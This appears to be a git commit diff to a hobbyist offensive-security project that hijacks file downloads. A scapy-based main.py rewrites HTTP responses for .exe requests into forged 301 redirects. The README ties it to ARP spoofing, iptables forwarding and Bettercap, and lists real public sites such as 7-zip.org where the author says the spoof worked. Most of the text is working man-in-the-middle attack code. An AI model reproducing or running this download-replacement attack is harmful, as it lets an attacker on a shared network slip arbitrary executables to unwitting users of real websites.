70f55bfcd066e9480d75982dd9cd688149f4c1f3
Vhackenstance <hackenstance@proton.me>
2026-06-29 06:55:40 -0500

    Using Bettercap tested against https, noice.

--- README.md
+++ README.md
@@ -1,6 +1,5 @@
 <h3>REPLACE DOWNLOAD</h3>
 <h4>Intercept Target download and replace it with Spoof file.</h4>
-<p>Unable to get this working with OWASP Juice Shop Locally http://localhost:3000/</p>
 <h4>Basic Stuff:</h4>
 <p>Tested and works so far with OWASP Juice Shop online
     <br/>
@@ -9,10 +8,9 @@
     When it is not broken lol.  Because, let us be clear.  This is the only http site, I 
     could find, which allows you to test downloads.  Due to this and many other reasons, 
     it is often broken.
-</p>
+<p>Does not work OWASP Juice Shop Locally http://localhost:3000/</p>
 <h4>Testing in General</h4>
 <p>Why test locally when you can straight up just test on Remote VM, on your lab.
-<br/> Cover two birds with one stone did this here and much easier.
 </p>
 <ol>
     <li>Enable port forwarding (1) just in case you want to remote.
@@ -21,18 +19,14 @@
     <li>
         Set ALL iptables - INPUT, OUTPUT, FORWARD. 
         <br />
-        There is not conflict local vs remote.
+        When using Bettercap we are using INPUT and OUTPUT
+        <br />
+        There is no conflict local vs remote.
     </li>
-    <li>This only works with arp_spoof.py, which sets you onPath.
-    <br />
-    Or, PitM (Person in the Middle) hehe.
+    <li>Enable arp_spoof.py, which sets you onPath.
     </li>
     <li>
-        Flush ip_tables when your finished. 
-        <br/>
-        But I sometimes just leave them running, this is my attack machine.
-        <br />
-        And it's a VM after all.
+        setup_environment will take care of all of this for you.
     </li>
     <li><b>Start webserver locally</b>: service apache2 start</li>
     <li>
@@ -50,4 +44,16 @@
 </p>
 <p>We want to use 301 - moved permanently - to tell our response packet it is being redirected.</p>
 <h4>Run on a remote computer</h4>
+<h4>Bettercap works with</h4>
+<ul>
+<li>Linkedin.com</li>
+<li>winzip.com</li>
+<li>Try loading in the full address with http, this works with 
+    http://7-zip.org - <b>Tested and worked to spoof download...</b>
+    <br/>
+    http://www.udemy.com/ - <b></b>
+    <br/>
+    You could try experimenting with a bunch more.
+</li>
+</ul>
 
--- main.py
+++ main.py
@@ -9,10 +9,10 @@ ack_list = []
 replace_download = "https://www.rarlab.com/rar/winrar-x64-722.exe"
 
 def set_load(packet, redirection):
-    # Tell Target link "moved permanently, 301" to our link
+    # Tell "moved permanently, 301" to our link
     # \n\n end clear us precaution
     packet[Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: " + redirection + "\n\n"
-    # For scapy to recalculate IP and Chksum values for our updated load
+    # For scapy to recalculate IP and Chksum values
     del packet[IP].len
     del packet[IP].chksum
     del packet[TCP].chksum
@@ -22,16 +22,20 @@ def process_packet(packet):
     scapy_packet= IP(packet.get_payload())
     if scapy_packet.haslayer(Raw):
         if scapy_packet.haslayer(TCP):
-            print("\n[+] Packet has layer TCP")
-            if scapy_packet[TCP].dport == 80:
+            # change port from HTTP port 80 to 8080
+            # the port used by the Bettercap redirection proxy
+            # AND ...  make sure our replace download DN is not in download
+            if scapy_packet[TCP].dport == 8080 and b"www.rarlab.com" not in scapy_packet[Raw].load:
                 print("[+] This is a HTTP Request:  ")
+                print(scapy_packet.show())
                 if b".exe" in scapy_packet[Raw].load:
-                    print("[+] Found an Exe Request:  ")
-                    print("[+] Here is our Acknowledgement Number: ")
+                    print("[+] Exe Request, acknowledgement number:  ")
                     print(scapy_packet[TCP].ack)
                     ack_list.append(scapy_packet[TCP].ack)
 
-            elif scapy_packet[TCP].sport == 80:
+            # change port from HTTP port 80 to 8080
+            # the port used by the Bettercap redirection proxy
+            elif scapy_packet[TCP].sport == 8080:
                 print("[+] This is a HTTP Response: ")
                 if scapy_packet[TCP].seq:
                     # print(scapy_packet.show())
@@ -44,8 +48,9 @@ def process_packet(packet):
                         print("[+] Replacing File: ")
                         modified_packet = set_load(scapy_packet, replace_download)
 
-                        # Modify the packet that will be sent to the target, with out updated packet.
+                        # Modify the packet that will be sent to the target, without updated packet.
                         packet.set_payload(modified_packet.build())
+
     packet.accept()
 
 
